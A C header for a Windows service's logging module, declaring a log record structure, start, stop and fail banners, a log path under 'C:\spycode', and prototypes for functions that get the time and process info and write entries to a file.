#ifndef _LOG_H_
#define _LOG_H_

#include <time.h>
#include <windows.h>
#include <stdio.h>
#include <io.h>
#include <direct.h>
#include <Psapi.h>

#pragma comment (lib,"Psapi.lib")

#define TIME_LEN 32
#define PATH_LEN MAX_PATH
#define TEXT_LEN 256
#define CODE_LEN 32
#define MAX_LOG (TIME_LEN + sizeof(DWORD) + PATH_LEN + TEXT_LEN + CODE_LEN + 1)

#define LOGPATH "C:\\spycode"
#define LOGFILE "C:\\spycode\\log.dat"

#define LOGSTART 0
#define LOGSTOP 1
#define LOGFAIL 2

#define LOGSTART_STR "========== SERVICE START =========="
#define LOGSTOP_STR "========== SERVICE STOP=========="
#define LOGFAIL_STR "========== SERVICE FAIL=========="

typedef struct _LOG_STRU{
	char time[TIME_LEN];
	DWORD pid;
	char path[PATH_LEN];
	char text[TEXT_LEN];
	char sCode[CODE_LEN];
}LOG_STRU,*PLOG_STRU;


int logGetTime(char *ptime);
int logGetInfo(PLOG_STRU plog);
void logPrintInfo(LOG_STRU log);
int logWriteFile(LOG_STRU log);
int logToFile(char *str);
int logCheckFile();

#endif // _LOG_H_
